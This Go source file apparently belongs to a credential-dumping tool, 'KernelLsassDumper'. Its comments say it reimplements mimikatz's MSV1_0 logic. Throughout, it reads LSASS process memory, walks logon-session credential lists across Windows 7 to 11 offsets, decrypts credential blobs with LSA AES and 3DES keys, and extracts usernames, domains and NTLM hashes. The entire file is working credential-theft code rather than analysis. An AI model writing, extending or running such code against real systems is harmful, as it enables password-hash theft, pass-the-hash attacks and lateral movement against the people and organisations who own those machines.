package lsass

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"
)

// DecryptAES - Simple AES-CFB decryption (LSA uses this for odd-length data)
func DecryptAES(data []byte, key []byte) []byte {
	if len(key) != 16 {
		return nil
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}

	// Use IV of zeros (LSA uses fixed IV from memory)
	iv := make([]byte, aes.BlockSize)
	stream := cipher.NewCFBDecrypter(block, iv)

	result := make([]byte, len(data))
	stream.XORKeyStream(result, data)
	return result
}

// Decrypt3DES - Simple 3DES-CBC decryption (LSA uses this for 8-byte aligned data)
func Decrypt3DES(data []byte, key []byte) []byte {
	if len(key) != 24 {
		return nil
	}
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil
	}

	// Use IV of zeros
	iv := make([]byte, des.BlockSize)
	mode := cipher.NewCBCDecrypter(block, iv)

	result := make([]byte, len(data))
	mode.CryptBlocks(result, data)
	return result
}

// MIMIKATZ-BASED CREDENTIAL EXTRACTION
// This implements the EXACT logic from mimikatz's kuhl_m_sekurlsa_msv_enum_cred function

// extractCredFromSession - Extract credentials from a KIWI_MSV1_0_LIST_6x entry
// This is the REAL implementation based on Mimikatz source code
func (kld *KernelLsassDumper) extractCredFromSession(sessionAddr uint64, hProcess syscall.Handle, aesKey []byte, des3Key []byte) []Credential {
	var credentials []Credential

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")

	readMem := func(addr uint64, size uint32) ([]byte, error) {
		buffer := make([]byte, size)
		var bytesRead uintptr

		ret, _, _ := readProcessMemory.Call(
			uintptr(hProcess),
			uintptr(addr),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(size),
			uintptr(unsafe.Pointer(&bytesRead)),
		)

		if ret == 0 {
			return nil, fmt.Errorf("ReadProcessMemory failed")
		}

		return buffer[:bytesRead], nil
	}

	// Read session entry (KIWI_MSV1_0_LIST_63 for Windows 10/11)
	sessionData, err := readMem(sessionAddr, 0x200)
	if err != nil {
		kld.logger.Warnf("Failed to read session at 0x%X: %v", sessionAddr, err)
		return credentials
	}

	kld.logger.Infof("Reading session entry at 0x%X", sessionAddr)

	// Try multiple possible offsets for Credentials pointer based on Windows version
	possibleOffsets := []struct {
		offset int
		name   string
	}{
		{0x108, "Win11_24H2/KIWI_MSV1_0_LIST_63"},
		{0xF8, "Win10_newer/KIWI_MSV1_0_LIST_62"},
		{0xD8, "Win10_older/KIWI_MSV1_0_LIST_61"},
		{0x78, "Win8/KIWI_MSV1_0_LIST_60"},
		{0x48, "Win7/KIWI_MSV1_0_LIST_52"},
	}

	var credentialsPtr uint64
	var foundOffset string

	for _, po := range possibleOffsets {
		if po.offset+8 <= len(sessionData) {
			testPtr := binary.LittleEndian.Uint64(sessionData[po.offset : po.offset+8])
			kld.logger.Infof("  Offset 0x%X (%s): 0x%X", po.offset, po.name, testPtr)

			// Valid kernel pointer should be in range 0x7FF000000000 - 0xFFFFFFFFFFFFFFFF
			if testPtr > 0x7FF000000000 && testPtr < 0xFFFFFFFFFFFFFFFF && credentialsPtr == 0 {
				credentialsPtr = testPtr
				foundOffset = po.name
			}
		}
	}

	if credentialsPtr == 0 {
		kld.logger.Warn("No valid Credentials pointer found at any known offset")
		return credentials
	}

	kld.logger.Infof("Using Credentials pointer: 0x%X from %s", credentialsPtr, foundOffset)

	// Walk the KIWI_MSV1_0_CREDENTIALS linked list
	// struct KIWI_MSV1_0_CREDENTIALS {
	//     struct KIWI_MSV1_0_CREDENTIALS *next;
	//     DWORD AuthenticationPackageId;
	//     PKIWI_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials;
	// };

	currentCredNode := credentialsPtr
	visited := make(map[uint64]bool)

	kld.logger.Infof("Walking KIWI_MSV1_0_CREDENTIALS chain starting at 0x%X", currentCredNode)

	for currentCredNode != 0 && len(visited) < 20 {
		if visited[currentCredNode] {
			kld.logger.Warn("  Circular reference detected")
			break
		}
		visited[currentCredNode] = true

		kld.logger.Infof("  Reading KIWI_MSV1_0_CREDENTIALS at 0x%X", currentCredNode)

		// Read KIWI_MSV1_0_CREDENTIALS structure (0x20 bytes)
		credNode, err := readMem(currentCredNode, 0x20)
		if err != nil {
			kld.logger.Warnf("  Failed to read credential node: %v", err)
			break
		}

		nextCredNode := binary.LittleEndian.Uint64(credNode[0x00:0x08])
		authPackageId := binary.LittleEndian.Uint32(credNode[0x08:0x0C])
		primaryCredPtr := binary.LittleEndian.Uint64(credNode[0x10:0x18])

		kld.logger.Infof("    next=0x%X, AuthPackageId=0x%08X, PrimaryCredentials=0x%X", nextCredNode, authPackageId, primaryCredPtr)

		if primaryCredPtr != 0 {
			// Walk PRIMARY_CREDENTIALS linked list
			creds := kld.extractPrimaryCredentials(primaryCredPtr, hProcess, aesKey, des3Key)
			credentials = append(credentials, creds...)
		}

		currentCredNode = nextCredNode
	}

	return credentials
}

// extractPrimaryCredentials - Walk KIWI_MSV1_0_PRIMARY_CREDENTIALS linked list
func (kld *KernelLsassDumper) extractPrimaryCredentials(primaryPtr uint64, hProcess syscall.Handle, aesKey []byte, des3Key []byte) []Credential {
	var credentials []Credential

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")

	readMem := func(addr uint64, size uint32) ([]byte, error) {
		buffer := make([]byte, size)
		var bytesRead uintptr

		ret, _, _ := readProcessMemory.Call(
			uintptr(hProcess),
			uintptr(addr),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(size),
			uintptr(unsafe.Pointer(&bytesRead)),
		)

		if ret == 0 {
			return nil, fmt.Errorf("ReadProcessMemory failed")
		}

		return buffer[:bytesRead], nil
	}

	currentPrimary := primaryPtr
	visited := make(map[uint64]bool)

	for currentPrimary != 0 && len(visited) < 20 {
		if visited[currentPrimary] {
			break
		}
		visited[currentPrimary] = true

		// struct KIWI_MSV1_0_PRIMARY_CREDENTIALS {
		//     struct KIWI_MSV1_0_PRIMARY_CREDENTIALS *next;  +0x00
		//     ANSI_STRING Primary;                            +0x08 (Length, MaxLength, Buffer ptr)
		//     LSA_UNICODE_STRING Credentials;                 +0x18 (ENCRYPTED buffer)
		// };

		primaryData, err := readMem(currentPrimary, 0x30)
		if err != nil {
			break
		}

		nextPrimary := binary.LittleEndian.Uint64(primaryData[0x00:0x08])

		// Parse Primary ANSI_STRING
		primaryStrLen := binary.LittleEndian.Uint16(primaryData[0x08:0x0A])
		primaryStrBuf := binary.LittleEndian.Uint64(primaryData[0x10:0x18])

		primaryName := ""
		if primaryStrLen > 0 && primaryStrBuf != 0 {
			nameData, err := readMem(primaryStrBuf, uint32(primaryStrLen))
			if err == nil {
				primaryName = string(nameData)
			}
		}

		kld.logger.Debugf("    Primary: %s", primaryName)

		// Only process "Primary" type credentials
		if primaryName != "Primary" {
			currentPrimary = nextPrimary
			continue
		}

		// Parse Credentials LSA_UNICODE_STRING (ENCRYPTED)
		credLen := binary.LittleEndian.Uint16(primaryData[0x18:0x1A])
		credBuf := binary.LittleEndian.Uint64(primaryData[0x20:0x28])

		kld.logger.Debugf("    Encrypted cred len=%d, buf=0x%X", credLen, credBuf)

		if credLen > 0 && credBuf != 0 {
			// Read encrypted credential buffer
			encryptedCred, err := readMem(credBuf, uint32(credLen))
			if err == nil {
				// DECRYPT using LSA keys
				cred := kld.decryptAndParseCred(encryptedCred, aesKey, des3Key, hProcess)
				if cred != nil {
					credentials = append(credentials, *cred)
				}
			}
		}

		currentPrimary = nextPrimary
	}

	return credentials
}

// decryptAndParseCred - Decrypt LSA credential blob and parse MSV1_0_PRIMARY_CREDENTIAL
func (kld *KernelLsassDumper) decryptAndParseCred(encryptedData []byte, aesKey []byte, des3Key []byte, hProcess syscall.Handle) *Credential {
	// Decrypt using lsasrv!LsaUnprotectMemory logic
	var decrypted []byte

	// Try AES (CFB mode) if length % 8 != 0
	if len(encryptedData)%8 != 0 && len(aesKey) > 0 {
		decrypted = DecryptAES(encryptedData, aesKey)
		kld.logger.Debugf("    Decrypted with AES (len=%d)", len(decrypted))
	} else if len(des3Key) > 0 {
		// Try 3DES (CBC mode)
		decrypted = Decrypt3DES(encryptedData, des3Key)
		kld.logger.Debugf("    Decrypted with 3DES (len=%d)", len(decrypted))
	}

	if decrypted == nil || len(decrypted) < 0x70 {
		return nil
	}

	// Parse MSV1_0_PRIMARY_CREDENTIAL_10_1607 structure
	// struct MSV1_0_PRIMARY_CREDENTIAL_10_1607 {
	//     LSA_UNICODE_STRING LogonDomainName;  +0x00
	//     LSA_UNICODE_STRING UserName;         +0x10
	//     PVOID pNtlmCredIsoInProc;            +0x20
	//     BOOLEAN isIso;                       +0x28
	//     BOOLEAN isNtOwfPassword;             +0x29
	//     BOOLEAN isLmOwfPassword;             +0x2A
	//     BOOLEAN isShaOwPassword;             +0x2B
	//     BOOLEAN isDPAPIProtected;            +0x2C
	//     BYTE align0, align1, align2;         +0x2D, +0x2E, +0x2F
	//     WORD isoSize;                        +0x30
	//     BYTE DPAPIProtected[16];             +0x32
	//     DWORD align3;                        +0x42
	//     BYTE NtOwfPassword[16];              +0x46
	//     BYTE LmOwfPassword[16];              +0x56
	//     BYTE ShaOwPassword[20];              +0x66
	// };

	// Read booleans
	isNtOwfPassword := decrypted[0x29] != 0

	if !isNtOwfPassword {
		return nil
	}

	// Extract NTLM hash
	ntlmHash := decrypted[0x46 : 0x46+16]
	ntlmHashStr := fmt.Sprintf("%X", ntlmHash)

	// Parse username and domain LSA_UNICODE_STRINGs
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")

	readMem := func(addr uint64, size uint32) ([]byte, error) {
		buffer := make([]byte, size)
		var bytesRead uintptr

		ret, _, _ := readProcessMemory.Call(
			uintptr(hProcess),
			uintptr(addr),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(size),
			uintptr(unsafe.Pointer(&bytesRead)),
		)

		if ret == 0 {
			return nil, fmt.Errorf("ReadProcessMemory failed")
		}

		return buffer[:bytesRead], nil
	}

	// Username (offset 0x10)
	usernameLen := binary.LittleEndian.Uint16(decrypted[0x10:0x12])
	usernamePtr := binary.LittleEndian.Uint64(decrypted[0x18:0x20])

	username := ""
	if usernameLen > 0 && usernamePtr != 0 {
		usernameData, err := readMem(usernamePtr, uint32(usernameLen))
		if err == nil {
			username = decodeUTF16LE(usernameData)
		}
	}

	// Domain (offset 0x00)
	domainLen := binary.LittleEndian.Uint16(decrypted[0x00:0x02])
	domainPtr := binary.LittleEndian.Uint64(decrypted[0x08:0x10])

	domain := ""
	if domainLen > 0 && domainPtr != 0 {
		domainData, err := readMem(domainPtr, uint32(domainLen))
		if err == nil {
			domain = decodeUTF16LE(domainData)
		}
	}

	if username == "" || ntlmHashStr == "" {
		return nil
	}

	kld.logger.Infof("    Found: %s\\%s  NTLM=%s", domain, username, ntlmHashStr)

	return &Credential{
		Username: username,
		Domain:   domain,
		NTLM:     ntlmHashStr,
		Type:     "msv1_0",
	}
}

func decodeUTF16LE(data []byte) string {
	if len(data) == 0 {
		return ""
	}

	// UTF-16LE: 2 bytes per character
	result := ""
	for i := 0; i+1 < len(data); i += 2 {
		char := uint16(data[i]) | (uint16(data[i+1]) << 8)
		if char == 0 {
			break
		}
		result += string(rune(char))
	}
	return result
}
